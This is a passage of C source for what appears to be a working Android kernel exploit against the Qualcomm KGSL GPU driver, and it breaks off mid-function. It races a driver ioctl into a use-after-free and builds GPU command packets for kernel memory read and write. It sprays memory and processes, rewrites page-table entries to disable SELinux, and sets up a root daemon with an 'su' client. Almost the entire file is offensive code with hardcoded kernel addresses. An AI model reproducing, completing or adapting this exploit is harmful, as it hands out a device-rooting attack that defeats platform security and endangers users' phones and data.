#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#include <inttypes.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <unistd.h>

#define KGSL_IOC_TYPE 0x09
#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
#define KGSL_USER_MEM_TYPE_ADDR 0x00000002U
#define DEV_PATH "/dev/kgsl-3d0"
#define PAGE_SIZE 4096ULL
#define UAF_START 0x00000007001ff000ULL
#define UAF_SIZE 0x0000000010004000ULL
#define OVERLAP_START 0x00000007001fe000ULL
#define OVERLAP_SIZE 0x0000000000007000ULL
#define PLACEH_START 0x0000000710204000ULL
#define PLACEH_SIZE 0x0000000000010000ULL
#define BOGUS_START 0x0000000700204000ULL
#define WRAP_SIZE 0xffffffffffefd000ULL
#define USER_DS 0x0000007fffffffffULL
#define KERNEL_DS 0xffffffffffffffffULL
#define TASKS_OFFSET 0x4b8ULL
#define CRED_OFFSET 0x760ULL
#define SUBJECTIVE_CRED_OFFSET 0x768ULL
#define REAL_CRED_OFFSET 0x760ULL
#define COMM_OFFSET 0x770ULL
#define THREAD_GROUP_OFFSET 0x620ULL
#define CHILDREN_OFFSET 0x5d8ULL
#define FAKE_CRED_OFFSET 0xf00ULL
#define FAKE_TSEC_OFFSET 0xfa0ULL
#define FAKE_SID 7U
#define ADDR_LIMIT_OFFSET 0x40ULL
#define INIT_TASK_NOKASLR 0xffffff800aa8d500ULL
#define INIT_CRED_NOKASLR 0xffffff800aa9e540ULL
#define ROOT_USER_NOKASLR 0xffffff800aa9d008ULL
#define INIT_USER_NS_NOKASLR 0xffffff800aa9ce50ULL
#define INIT_GROUPS_NOKASLR 0xffffff800aa9e5e8ULL
#define UDP_PROT_NOKASLR 0xffffff800ac18b70ULL
#define SELINUX_STATE_NOKASLR 0xffffff800aeb33b8ULL
#define KERNEL_BASE_VA 0xffffff8008080000ULL
#define KERNEL_PHYS_TEXT 0x80080000ULL
#define SELINUX_STATE_PHYS (KERNEL_PHYS_TEXT + (SELINUX_STATE_NOKASLR - KERNEL_BASE_VA))
#define MMAP_SPRAY_COUNT 12000
#define MMAP_SPRAY_STRIDE 0x200000ULL
#define MMAP_SPRAY_BASE 0x0000000200000000ULL
#define MAX_PT_CANDIDATES 64
#define PHYS_MASK ((1ULL << 48) - 1)
#define PAGE_MASK (~(PAGE_SIZE - 1))
#define FAIR_SCHED_CLASS_NOKASLR 0xffffff800a21e3c8ULL
#define SCHED_CLASS_OFFSET 0xb8ULL
#define SPRAY_MAX 20000
#define SPRAY_INITIAL 16000
#define ROOT_SOCKET "coral_rootd"
#define CP_NOP 0x10
#define CP_MEM_WRITE 0x3d
#define CP_MEM_TO_MEM 0x73
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CMDLIST_IB 0x00000001U
#define KGSL_TIMESTAMP_RETIRED 0x00000002

struct kgsl_gpuobj_alloc {
    uint64_t size;
    uint64_t flags;
    uint64_t va_len;
    uint64_t mmapsize;
    unsigned int id;
    unsigned int metadata_len;
    uint64_t metadata;
};

struct kgsl_gpuobj_free {
    uint64_t flags;
    uint64_t priv;
    unsigned int id;
    unsigned int type;
    unsigned int len;
};

struct kgsl_map_user_mem {
    int fd;
    unsigned long gpuaddr;
    size_t len;
    size_t offset;
    unsigned long hostptr;
    unsigned int memtype;
    unsigned int flags;
};

struct kgsl_drawctxt_create {
    unsigned int flags;
    unsigned int drawctxt_id;
};

struct kgsl_drawctxt_destroy {
    unsigned int drawctxt_id;
};

struct kgsl_command_object {
    uint64_t offset;
    uint64_t gpuaddr;
    uint64_t size;
    unsigned int flags;
    unsigned int id;
};

struct kgsl_gpu_command {
    uint64_t flags;
    uint64_t cmdlist;
    unsigned int cmdsize;
    unsigned int numcmds;
    uint64_t objlist;
    unsigned int objsize;
    unsigned int numobjs;
    uint64_t synclist;
    unsigned int syncsize;
    unsigned int numsyncs;
    unsigned int context_id;
    unsigned int timestamp;
};

struct kgsl_cmdstream_readtimestamp_ctxtid {
    unsigned int context_id;
    unsigned int type;
    unsigned int timestamp;
};

struct kgsl_gpuobj_info {
    uint64_t gpuaddr;
    uint64_t flags;
    uint64_t size;
    uint64_t va_len;
    uint64_t va_addr;
    unsigned int id;
};

#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)
#define IOCTL_KGSL_MAP_USER_MEM _IOWR(KGSL_IOC_TYPE, 0x15, struct kgsl_map_user_mem)
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
#define IOCTL_KGSL_DRAWCTXT_DESTROY _IOW(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy)
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID \
    _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4a, struct kgsl_gpu_command)

struct race_state {
    int fd;
    volatile int ready;
    volatile int started;
    volatile int result;
    volatile int error;
};

struct resources {
    unsigned int uaf_id;
    unsigned int overlap_id;
    unsigned int placeholder_id;
    uint64_t uaf_mmapsize;
    uint64_t overlap_mmapsize;
    uint64_t placeholder_mmapsize;
    void *uaf_mapping;
    void *overlap_mapping;
    void *placeholder_mapping;
    void *bogus_mapping;
};

struct spray_slot {
    pid_t pid;
    volatile int action;
};

struct shared_state {
    struct spray_slot slots[SPRAY_MAX];
    volatile int stage;
    volatile int root_result;
    volatile int child_step;
    volatile int observed_uid;
    volatile int daemon_stage;
    volatile int daemon_errno;
    volatile unsigned int sid_seq;
    volatile unsigned int sid_ack;
    volatile int sid_result;
    volatile unsigned int current_sid;
    volatile pid_t broker_pid;
    volatile unsigned int command_seq;
    volatile unsigned int command_done;
    volatile unsigned int command_ack;
    volatile int child_status;
    volatile int exec_stage;
    volatile int exec_errno;
    volatile int eventfd_ready;
    char command[4096];
    volatile int selected_index;
    volatile uint64_t task_list;
    volatile uint64_t own_task;
    volatile uint64_t init_task;
    volatile uint64_t cred;
    volatile uint64_t kaslr_slide;
    char selected_comm[16];
    char error[128];
};

struct gpu_state {
    int fd;
    unsigned int context_id;
    unsigned int ib_id;
    unsigned int dst_id;
    uint64_t ib_mmapsize;
    uint64_t dst_mmapsize;
    uint64_t ib_gpu;
    uint64_t dst_gpu;
    void *ib_mapping;
    void *dst_mapping;
};

static int root_listener = -1;
static int root_log_fd = -1;
static int root_null_fd = -1;
static int root_output_pipe[2] = {-1, -1};
static int socket_fds[16384];

struct pt_candidate {
    uint64_t gpu_va;
    uint64_t original;
    uint64_t alias;
};

static struct pt_candidate pt_candidates[MAX_PT_CANDIDATES];
static unsigned int pt_candidate_count;
static uint8_t mmap_sig[5] = {1, 3, 5, 7, 9};

static void free_object(int fd, unsigned int *id) {
    struct kgsl_gpuobj_free req = {0};
    if (*id == 0)
        return;
    req.id = *id;
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &req) != 0)
        fprintf(stderr, "free id=%u failed: %s\n", *id, strerror(errno));
    *id = 0;
}

static void *map_object(int fd, unsigned int id, uint64_t size, uint64_t address) {
    return mmap((void *)(uintptr_t)address, size, PROT_READ | PROT_WRITE,
                MAP_SHARED | MAP_FIXED, fd, (off_t)id << 12);
}

static int allocate_object(int fd, uint64_t size, unsigned int *id, uint64_t *mmapsize) {
    struct kgsl_gpuobj_alloc req = {
        .size = size,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
    };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &req) != 0)
        return -1;
    *id = req.id;
    *mmapsize = req.mmapsize;
    return 0;
}

static void *bogus_racer(void *argument) {
    struct race_state *state = argument;
    struct kgsl_map_user_mem req = {
        .fd = -1,
        .gpuaddr = 0,
        .len = WRAP_SIZE,
        .offset = 0,
        .hostptr = BOGUS_START,
        .memtype = KGSL_USER_MEM_TYPE_ADDR,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
    };

    while (!__atomic_load_n(&state->ready, __ATOMIC_ACQUIRE))
        __asm__ __volatile__("" ::: "memory");
    __atomic_store_n(&state->started, 1, __ATOMIC_RELEASE);
    state->result = ioctl(state->fd, IOCTL_KGSL_MAP_USER_MEM, &req);
    state->error = errno;
    __atomic_thread_fence(__ATOMIC_RELEASE);
    return NULL;
}

static void unmap_resource(void **mapping, uint64_t size) {
    if (*mapping != NULL && *mapping != MAP_FAILED) {
        munmap(*mapping, size);
        *mapping = NULL;
    }
}

static void cleanup(int fd, struct resources *res) {
    unmap_resource(&res->overlap_mapping, res->overlap_mmapsize);
    unmap_resource(&res->placeholder_mapping, res->placeholder_mmapsize);
    unmap_resource(&res->uaf_mapping, res->uaf_mmapsize);
    unmap_resource(&res->bogus_mapping, PAGE_SIZE * 3);
    free_object(fd, &res->overlap_id);
    free_object(fd, &res->placeholder_id);
    free_object(fd, &res->uaf_id);
}

static int attempt(unsigned int delay_us, int *won, int *kept_fd, struct resources *kept_res) {
    struct resources res = {0};
    struct race_state state = {
        .result = -1000,
    };
    pthread_t thread;
    int thread_started = 0;
    int overlap_errno = 0;
    int fd = -1;
    int rc = -1;

    *won = 0;
    *kept_fd = -1;
    fd = open(DEV_PATH, O_RDWR | O_CLOEXEC);
    if (fd < 0) {
        fprintf(stderr, "open failed: %s\n", strerror(errno));
        return -1;
    }

    if (allocate_object(fd, UAF_SIZE, &res.uaf_id, &res.uaf_mmapsize) != 0) {
        fprintf(stderr, "UAF alloc failed: %s\n", strerror(errno));
        goto out;
    }
    if (allocate_object(fd, OVERLAP_SIZE, &res.overlap_id, &res.overlap_mmapsize) != 0) {
        fprintf(stderr, "OVERLAP alloc failed: %s\n", strerror(errno));
        goto out;
    }
    res.uaf_mapping = map_object(fd, res.uaf_id, res.uaf_mmapsize, UAF_START);
    if (res.uaf_mapping == MAP_FAILED) {
        fprintf(stderr, "UAF mmap failed: %s\n", strerror(errno));
        goto out;
    }
    for (uint64_t offset = 0; offset < res.uaf_mmapsize; offset += PAGE_SIZE)
        ((volatile unsigned char *)res.uaf_mapping)[offset] = 1;
    unmap_resource(&res.uaf_mapping, res.uaf_mmapsize);

    res.bogus_mapping = mmap((void *)(uintptr_t)BOGUS_START, PAGE_SIZE * 3,
                             PROT_READ | PROT_WRITE,
                             MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (res.bogus_mapping == MAP_FAILED) {
        fprintf(stderr, "BOGUS anonymous mmap failed: %s\n", strerror(errno));
        goto out;
    }
    for (unsigned int i = 0; i < 3; ++i)
        ((volatile unsigned char *)res.bogus_mapping)[i * PAGE_SIZE] = 1;

    if (allocate_object(fd, PLACEH_SIZE, &res.placeholder_id, &res.placeholder_mmapsize) != 0) {
        fprintf(stderr, "PLACEHOLDER alloc failed: %s\n", strerror(errno));
        goto out;
    }
    res.placeholder_mapping = map_object(fd, res.placeholder_id,
                                         res.placeholder_mmapsize, PLACEH_START);
    if (res.placeholder_mapping == MAP_FAILED) {
        fprintf(stderr, "PLACEHOLDER mmap failed: %s\n", strerror(errno));
        goto out;
    }

    state.fd = fd;
    if (pthread_create(&thread, NULL, bogus_racer, &state) != 0) {
        fprintf(stderr, "pthread_create failed\n");
        goto out;
    }
    thread_started = 1;
    __atomic_store_n(&state.ready, 1, __ATOMIC_RELEASE);
    while (!__atomic_load_n(&state.started, __ATOMIC_ACQUIRE))
        sched_yield();
    if (delay_us != 0)
        usleep(delay_us);
    res.overlap_mapping = map_object(fd, res.overlap_id,
                                     res.overlap_mmapsize, OVERLAP_START);
    overlap_errno = errno;
    pthread_join(thread, NULL);
    thread_started = 0;

    printf("overlap=%s errno=%d bogus_result=%d bogus_errno=%d ids=%u/%u/%u\n",
           res.overlap_mapping == MAP_FAILED ? "FAILED" : "MAPPED",
           res.overlap_mapping == MAP_FAILED ? overlap_errno : 0,
           state.result, state.error, res.uaf_id, res.overlap_id, res.placeholder_id);
    fflush(stdout);
    if (res.overlap_mapping == MAP_FAILED && overlap_errno == ENODEV) {
        *won = 1;
        rc = 0;
    }

out:
    if (thread_started) {
        __atomic_store_n(&state.ready, 1, __ATOMIC_RELEASE);
        pthread_join(thread, NULL);
    }
    if (*won && rc == 0) {
        *kept_fd = fd;
        *kept_res = res;
        return 0;
    }
    cleanup(fd, &res);
    close(fd);
    return rc;
}

static int run_exploit(int fd, struct resources *res, unsigned int delay_us,
                       struct shared_state *shared);
static int prepare_root_socket(void);
static int run_client(int argc, char **argv);

int main(int argc, char **argv) {
    unsigned int attempts = 20;
    unsigned int delay_us = 10;
    int fd = -1;
    struct resources res = {0};
    struct shared_state *shared;
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    if (argc > 1 && strcmp(argv[1], "su") == 0)
        return run_client(argc - 1, argv + 1);
    if (argc > 1)
        attempts = (unsigned int)strtoul(argv[1], NULL, 0);
    if (argc > 2)
        delay_us = (unsigned int)strtoul(argv[2], NULL, 0);
    shared = mmap(NULL, sizeof(*shared), PROT_READ | PROT_WRITE,
                  MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (shared == MAP_FAILED) {
        fprintf(stderr, "shared mmap failed: %s\n", strerror(errno));
        return 1;
    }
    memset(shared, 0, sizeof(*shared));
    root_listener = prepare_root_socket();
    root_log_fd = open("/data/local/tmp/coral_rootd.log",
                       O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
    root_null_fd = open("/dev/null", O_RDWR | O_CLOEXEC);
    if (root_listener < 0 || root_log_fd < 0 || root_null_fd < 0) {
        fprintf(stderr, "prepare root resources failed: %s\n", strerror(errno));
        return 1;
    }
    printf("pid=%d attempts=%u delay_us=%u\n", getpid(), attempts, delay_us);

    for (unsigned int i = 1; i <= attempts; ++i) {
        int won = 0;
        printf("attempt=%u\n", i);
        if (attempt(delay_us, &won, &fd, &res) == 0 && won) {
            int rc;
            printf("RACE_WON attempt=%u delay_us=%u\n", i, delay_us);
            free_object(fd, &res.uaf_id);
            rc = run_exploit(fd, &res, delay_us, shared);
            cleanup(fd, &res);
            close(fd);
            if (rc == 0)
                printf("ROOT_DAEMON_DETACHED\n");
            munmap(shared, sizeof(*shared));
            return rc;
        }
        usleep(1000000);
    }
    printf("RACE_NOT_WON\n");
    close(root_listener);
    close(root_log_fd);
    close(root_null_fd);
    munmap(shared, sizeof(*shared));
    return 1;
}

static void selected_child(struct shared_state *shared, int index);

static inline uint32_t pm4_parity(uint32_t value) {
    return (0x9669u >> (0x0fu & (value ^ (value >> 4) ^ (value >> 8) ^
                                (value >> 12) ^ (value >> 16) ^ (value >> 20) ^
                                (value >> 24) ^ (value >> 28)))) & 1u;
}

static inline uint32_t cp_type7_packet(uint32_t opcode, uint32_t count) {
    return (7u << 28) | (count & 0x3fffu) | (pm4_parity(count) << 15) |
           ((opcode & 0x7fu) << 16) | (pm4_parity(opcode) << 23);
}

static inline void split64(uint64_t address, uint32_t *low, uint32_t *high) {
    *low = (uint32_t)address;
    *high = (uint32_t)(address >> 32);
}

static int wait_timestamp(int fd, unsigned int context_id, unsigned int target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid req = {
        .context_id = context_id,
        .type = KGSL_TIMESTAMP_RETIRED,
    };
    for (unsigned int spins = 0; spins < 100000; ++spins) {
        if (ioctl(fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &req) != 0)
            return -1;
        if (req.timestamp >= target)
            return 0;
        usleep(100);
    }
    errno = ETIMEDOUT;
    return -1;
}

static int gpu_setup(struct gpu_state *gpu, int fd) {
    struct kgsl_drawctxt_create context = {
        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC,
    };
    struct kgsl_gpuobj_info info = {0};
    memset(gpu, 0, sizeof(*gpu));
    gpu->fd = fd;
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &context) != 0)
        return -1;
    gpu->context_id = context.drawctxt_id;
    if (allocate_object(fd, PAGE_SIZE * 8, &gpu->ib_id, &gpu->ib_mmapsize) != 0)
        return -1;
    gpu->ib_mapping = mmap(NULL, gpu->ib_mmapsize, PROT_READ | PROT_WRITE,
                           MAP_SHARED, fd, (off_t)gpu->ib_id << 12);
    if (gpu->ib_mapping == MAP_FAILED)
        return -1;
    info.id = gpu->ib_id;
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info) != 0)
        return -1;
    gpu->ib_gpu = info.gpuaddr;
    if (allocate_object(fd, PAGE_SIZE, &gpu->dst_id, &gpu->dst_mmapsize) != 0)
        return -1;
    gpu->dst_mapping = mmap(NULL, gpu->dst_mmapsize, PROT_READ | PROT_WRITE,
                            MAP_SHARED, fd, (off_t)gpu->dst_id << 12);
    if (gpu->dst_mapping == MAP_FAILED)
        return -1;
    memset(&info, 0, sizeof(info));
    info.id = gpu->dst_id;
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info) != 0)
        return -1;
    gpu->dst_gpu = info.gpuaddr;
    return gpu->ib_gpu != 0 && gpu->dst_gpu != 0 ? 0 : -1;
}

static void gpu_cleanup(struct gpu_state *gpu) {
    struct kgsl_drawctxt_destroy destroy = {
        .drawctxt_id = gpu->context_id,
    };
    if (gpu->dst_mapping != NULL && gpu->dst_mapping != MAP_FAILED)
        munmap(gpu->dst_mapping, gpu->dst_mmapsize);
    if (gpu->ib_mapping != NULL && gpu->ib_mapping != MAP_FAILED)
        munmap(gpu->ib_mapping, gpu->ib_mmapsize);
    free_object(gpu->fd, &gpu->dst_id);
    free_object(gpu->fd, &gpu->ib_id);
    if (gpu->context_id != 0)
        ioctl(gpu->fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &destroy);
}

static int gpu_submit(struct gpu_state *gpu, size_t bytes) {
    struct kgsl_command_object object = {
        .gpuaddr = gpu->ib_gpu,
        .size = bytes,
        .flags = KGSL_CMDLIST_IB,
        .id = gpu->ib_id,
    };
    struct kgsl_gpu_command command = {
        .cmdlist = (uint64_t)(uintptr_t)&object,
        .cmdsize = sizeof(object),
        .numcmds = 1,
        .context_id = gpu->context_id,
    };
    msync(gpu->ib_mapping, bytes, MS_SYNC);
    if (ioctl(gpu->fd, IOCTL_KGSL_GPU_COMMAND, &command) != 0)
        return -1;
    return wait_timestamp(gpu->fd, gpu->context_id, command.timestamp);
}

static int gpu_read_page(struct gpu_state *gpu, uint64_t source, void *output) {
    uint32_t *command = gpu->ib_mapping;
    size_t dword = 0;
    memset(gpu->dst_mapping, 0, PAGE_SIZE);
    command[dword++] = cp_type7_packet(CP_NOP, 0);
    for (unsigned int i = 0; i < 1024; ++i) {
        uint32_t dst_low, dst_high, src_low, src_high;
        split64(gpu->dst_gpu + (uint64_t)i * 4, &dst_low, &dst_high);
        split64(source + (uint64_t)i * 4, &src_low, &src_high);
        command[dword++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
        command[dword++] = 0;
        command[dword++] = dst_low;
        command[dword++] = dst_high;
        command[dword++] = src_low;
        command[dword++] = src_high;
    }
    command[dword++] = cp_type7_packet(CP_NOP, 0);
    if (gpu_submit(gpu, dword * 4) != 0)
        return -1;
    msync(gpu->dst_mapping, PAGE_SIZE, MS_SYNC | MS_INVALIDATE);
    memcpy(output, gpu->dst_mapping, PAGE_SIZE);
    return 0;
}

static int gpu_read64(struct gpu_state *gpu, uint64_t source, uint64_t *value) {
    uint32_t *command = gpu->ib_mapping;
    uint32_t low, high;
    size_t dword = 0;
    memset(gpu->dst_mapping, 0, 16);
    command[dword++] = cp_type7_packet(CP_NOP, 0);
    for (unsigned int i = 0; i < 2; ++i) {
        uint32_t dst_low, dst_high, src_low, src_high;
        split64(gpu->dst_gpu + i * 4, &dst_low, &dst_high);
        split64(source + i * 4, &src_low, &src_high);
        command[dword++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
        command[dword++] = 0;
        command[dword++] = dst_low;
        command[dword++] = dst_high;
        command[dword++] = src_low;
        command[dword++] = src_high;
    }
    if (gpu_submit(gpu, dword * 4) != 0)
        return -1;
    msync(gpu->dst_mapping, 16, MS_SYNC | MS_INVALIDATE);
    low = ((uint32_t *)gpu->dst_mapping)[0];
    high = ((uint32_t *)gpu->dst_mapping)[1];
    *value = ((uint64_t)high << 32) | low;
    return 0;
}

static int gpu_write64(struct gpu_state *gpu, uint64_t target, uint64_t value) {
    uint32_t *command = gpu->ib_mapping;
    size_t dword = 0;
    for (unsigned int i = 0; i < 4; ++i)
        command[dword++] = cp_type7_packet(CP_NOP, 0);
    for (unsigned int i = 0; i < 2; ++i) {
        uint32_t low, high;
        split64(target + i * 4, &low, &high);
        command[dword++] = cp_type7_packet(CP_MEM_WRITE, 3);
        command[dword++] = low;
        command[dword++] = high;
        command[dword++] = i == 0 ? (uint32_t)value : (uint32_t)(value >> 32);
    }
    for (unsigned int i = 0; i < 4; ++i)
        command[dword++] = cp_type7_packet(CP_NOP, 0);
    return gpu_submit(gpu, dword * 4);
}

static unsigned int mmap_spray_done;

static int create_mmap_spray(void) {
    mmap_spray_done = 0;
    for (unsigned int i = 0; i < MMAP_SPRAY_COUNT; ++i) {
        uint8_t *base = (uint8_t *)(uintptr_t)(MMAP_SPRAY_BASE +
                                              (uint64_t)i * MMAP_SPRAY_STRIDE);
        for (unsigned int j = 0; j < 5; ++j) {
            uint8_t *address = base + mmap_sig[j] * PAGE_SIZE;
            void *mapping = mmap(address, PAGE_SIZE, PROT_READ | PROT_WRITE,
                                 MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
            if (mapping != address)
                return -1;
            *(volatile uint8_t *)address = mmap_sig[j];
        }
        mmap_spray_done = i + 1;
    }
    return 0;
}

static void free_mmap_spray(void) {
    for (unsigned int i = 0; i < mmap_spray_done; ++i) {
        uint8_t *base = (uint8_t *)(uintptr_t)(MMAP_SPRAY_BASE +
                                              (uint64_t)i * MMAP_SPRAY_STRIDE);
        for (unsigned int j = 0; j < 5; ++j)
            munmap(base + mmap_sig[j] * PAGE_SIZE, PAGE_SIZE);
    }
    mmap_spray_done = 0;
}

static void trim_mmap_spray(uint8_t *keep) {
    for (unsigned int i = 0; i < mmap_spray_done; ++i) {
        uint8_t *base = (uint8_t *)(uintptr_t)(MMAP_SPRAY_BASE +
                                              (uint64_t)i * MMAP_SPRAY_STRIDE);
        for (unsigned int j = 0; j < 5; ++j) {
            uint8_t *address = base + mmap_sig[j] * PAGE_SIZE;
            if (address != keep)
                munmap(address, PAGE_SIZE);
        }
    }
    mmap_spray_done = 0;
}

static uint8_t *find_pte_alias(void) {
    for (unsigned int i = 0; i < mmap_spray_done; ++i) {
        uint8_t *base = (uint8_t *)(uintptr_t)(MMAP_SPRAY_BASE +
                                              (uint64_t)i * MMAP_SPRAY_STRIDE);
        uint8_t *address = base + mmap_sig[0] * PAGE_SIZE;
        if (*(volatile uint8_t *)address == mmap_sig[1])
            return address;
    }
    return NULL;
}

static int disable_selinux_via_pagetables(struct gpu_state *gpu) {
    for (unsigned int i = 0; i < pt_candidate_count; ++i) {
        struct pt_candidate *candidate = &pt_candidates[i];
        if (gpu_write64(gpu, candidate->gpu_va + 8, candidate->alias) != 0)
            return -1;
        usleep(200000);
        uint8_t *target = find_pte_alias();
        if (target == NULL) {
            gpu_write64(gpu, candidate->gpu_va + 8, candidate->original);
            continue;
        }
        printf("PTE_ALIAS_FOUND candidate=%u target=%p\n", i, target);
        trim_mmap_spray(target);
        static const uint64_t bases[] = {
            0x80080000ULL, 0x40080000ULL, 0x88080000ULL,
            0x80000000ULL, 0x40000000ULL, 0x88000000ULL,
            0x100000000ULL, 0x400000000ULL, 0x800000000ULL,
            0x10000000ULL, 0x20000000ULL, 0x60000000ULL,
            0x70000000ULL, 0x90000000ULL, 0xa0000000ULL,
        };
        uint64_t pfn_mask = PHYS_MASK & PAGE_MASK;
        int disabled = 0;
        uint8_t *probe = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                              MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        if (probe == MAP_FAILED)
            return -1;
        for (unsigned int base_index = 0; base_index < sizeof(bases) / sizeof(bases[0]); ++base_index) {
            uint64_t physical = bases[base_index] +
                                (SELINUX_STATE_NOKASLR - KERNEL_BASE_VA);
            uint64_t mapped = ((candidate->original & ~pfn_mask) |
                               (physical & pfn_mask) | 0x400ULL);
            if (gpu_write64(gpu, candidate->gpu_va + 8, mapped) != 0)
                return -1;
            usleep(500000);
            if (mprotect(target, PAGE_SIZE, PROT_READ | PROT_WRITE) != 0)
                return -1;
            memset(probe, 0, 64);
            size_t start = (size_t)(physical & 0xfffULL);
            memcpy(probe, target + start, 64);
            int pointer_count = 0;
            for (unsigned int off = 24; off + 8 <= 64; off += 8) {
                uint64_t pointer;
                memcpy(&pointer, probe + off, sizeof(pointer));
                if ((pointer >> 48) == 0xffff)
                    ++pointer_count;
            }
            printf("SELINUX_STATE_CANDIDATE base=0x%llx bytes=%u,%u,%u,%u pointers=%d\n",
                   (unsigned long long)bases[base_index], probe[0], probe[1], probe[2],
                   probe[3], pointer_count);
            if (probe[0] != 0 || probe[1] != 1 || probe[2] != 0 || probe[3] != 1 ||
                pointer_count < 1)
                continue;
            size_t offset = (size_t)(physical & 0xfffULL) + 1;
            *(volatile uint8_t *)(target + offset) = 0;
            __sync_synchronize();
            probe[1] = *(volatile uint8_t *)(target + offset);
            usleep(100000);
            char mode = '1';
            int enforce = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
            if (enforce >= 0) {
                read(enforce, &mode, 1);
                close(enforce);
            }
            printf("SELINUX_SIGNATURE_WRITE base=0x%llx new=%u mode=%c\n",
                   (unsigned long long)bases[base_index], probe[1], mode);
            if (mode == '0')
                disabled = 1;
            break;
        }
        munmap(probe, PAGE_SIZE);
        gpu_write64(gpu, candidate->gpu_va + 8, candidate->original);
        usleep(500000);
        return disabled ? 0 : -1;
    }
    return -1;
}

static int apply_memory_pressure(size_t size) {
    unsigned char *mapping = mmap(NULL, size, PROT_READ | PROT_WRITE,
                                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mapping == MAP_FAILED)
        return -1;
    for (size_t offset = 0; offset < size; offset += PAGE_SIZE)
        ((volatile unsigned char *)mapping)[offset] = (unsigned char)(offset >> 12);
    munmap(mapping, size);
    return 0;
}

static int start_socket_holder(struct shared_state *shared, unsigned int count) {
    pid_t pid = fork();
    if (pid != 0)
        return pid;
    struct rlimit limit = {16384, 16384};
    setsid();
    setrlimit(RLIMIT_NOFILE, &limit);
    prctl(PR_SET_NAME, "coral_sockhold", 0, 0, 0);
    if (count > 16384)
        count = 16384;
    unsigned int created = 0;
    for (unsigned int i = 0; i < count; ++i) {
        socket_fds[i] = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
        if (socket_fds[i] < 0)
            break;
        ++created;
    }
    __atomic_store_n(&shared->eventfd_ready, (int)created, __ATOMIC_RELEASE);
    for (;;)
        pause();
}

static int spray_tasks(struct shared_state *shared, unsigned int requested) {
    unsigned int created = 0;
    for (unsigned int i = 0; i < requested; ++i) {
        pid_t pid = fork();
        if (pid < 0) {
            fprintf(stderr, "fork stopped at %u: %s\n", i, strerror(errno));
            break;
        }
        if (pid == 0) {
            char comm[16];
            snprintf(comm, sizeof(comm), "CORAL%05d", getpid());
            prctl(PR_SET_NAME, comm, 0, 0, 0);
            while (__atomic_load_n(&shared->slots[i].action, __ATOMIC_ACQUIRE) == 0)
                usleep(100000);
            if (shared->slots[i].action == 1)
                selected_child(shared, (int)i);
            _exit(0);
        }
        shared->slots[i].pid = pid;
        ++created;
    }
    return (int)created;
}

static void stop_spray(struct shared_state *shared, unsigned int count, pid_t exclude) {
    for (unsigned int i = 0; i < count; ++i) {
        pid_t pid = shared->slots[i].pid;
        if (pid <= 0 || pid == exclude)
            continue;
        __atomic_store_n(&shared->slots[i].action, 2, __ATOMIC_RELEASE);
        kill(pid, SIGTERM);
    }
    for (unsigned int i = 0; i < count; ++i) {
        pid_t pid = shared->slots[i].pid;
        if (pid > 0 && pid != exclude) {
            while (waitpid(pid, NULL, 0) < 0 && errno == EINTR)
                ;
        }
    }
}

static int prepare_root_socket(void) {
    struct sockaddr_un address = {0};
    int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
    if (fd < 0)
        return -1;
    address.sun_family = AF_UNIX;
    address.sun_path[0] = '\0';
    snprintf(address.sun_path + 1, sizeof(address.sun_path) - 1, "%s", ROOT_SOCKET);
    socklen_t length = (socklen_t)(offsetof(struct sockaddr_un, sun_path) + 1 + strlen(ROOT_SOCKET));
    if (bind(fd, (struct sockaddr *)&address, length) != 0 || listen(fd, 8) != 0) {
        close(fd);
        return -1;
    }
    return fd;
}

static int write_client_all(int fd, const void *data, size_t length) {
